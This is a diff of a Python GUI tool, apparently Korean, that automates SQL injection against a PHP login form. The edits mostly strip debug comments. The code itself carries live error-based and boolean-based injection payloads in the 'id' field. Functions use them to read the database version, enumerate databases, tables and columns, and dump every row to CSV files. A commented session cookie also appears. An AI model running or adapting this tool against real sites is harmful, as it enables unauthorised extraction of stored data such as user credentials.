@@ -9,23 +9,18 @@ from tkinter import Label, LabelFrame, Toplevel, ttk
 #cookies = {'PHPSESSID': 'l7j1upr6tomr6d0mephanot9a1'}
 check = '로그인 성공'.encode()
 
-# value_sample = Duplicate entry '~5.7.34-0ubuntu0.18.04.1~1' for key ''
 def extract(value):
   result = ''
-  start = value.find("~") #print(start)
-  end = value.find("~", start+1) #print(end)
+  start = value.find("~") 
+  end = value.find("~", start+1)
 
-  # result = 5.7.34-0ubuntu0.18.04.1
   result = value[(start+1):end]
-
   return result
 
 
 def find_db_version(url, cookies):
   result = ''
-
   value = "' or 1=1 and (select 1 from(select count(*), concat((select (select concat(0x7e, cast(version() as char), 0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); #"
-
   params = {'id': value, 'pw': 'test'}
   response = requests.post(url, data=params, cookies=cookies)
   soup = BeautifulSoup(response.text, "html.parser")
@@ -41,7 +36,6 @@ def count_db(url, cookies):
     print(value)
     params = {'id': value, 'pw': 'test'}
     response = requests.post(url, data=params, cookies=cookies)
-		#print(value)
     if check in response.text.encode('utf-8'):
       break
     else:
@@ -54,8 +48,7 @@ def count_data(url, cookies, table_name):
     value = "' or 1=1 and (SELECT count(*) from {}) = {}#".format(table_name, result)
     params = {'id': value, 'pw': 'test'}
     response = requests.post(url,data=params, cookies=cookies)
-		#print(response.content)
-		#print(value)
+    print(value)
     if check in response.text.encode('utf-8'):
       break
     else:
@@ -76,7 +69,6 @@ def find_db_name(values, url, cookies):
         break
       else:
         soup = BeautifulSoup(response.text, "html.parser")
-        #values.append(extract(soup.p.text))
         values.append(extract(soup.p.text))
   
     print(values)
@@ -120,14 +112,11 @@ def find_column_name(columnList, url, cookies, table_name):
     messagebox.showinfo("성공", "column 추출 완료")
     return columnList
 
-#print(find_column_name('center'))
-
 
 def dump_data(url, cookies, table_name, column_list):
   result = ''
   size = 0
   count = count_data(url, cookies, table_name)
-#  count = count_data()
   dict = {}
     
   for column_name in column_list:
@@ -148,10 +137,8 @@ def dump_data(url, cookies, table_name, column_list):
         else:
           list.append(res)
         
-        #print(list)
     
     dict[column_name] = list
-    #print(list)
     size += 1
   
   print(dict)
@@ -159,5 +146,3 @@ def dump_data(url, cookies, table_name, column_list):
   dataFrame.to_csv('{}.csv'.format(table_name))
   messagebox.showinfo("성공", "data dump 완료")
   return dict
-
-#print(dump_data('center', find_column_name('center')))
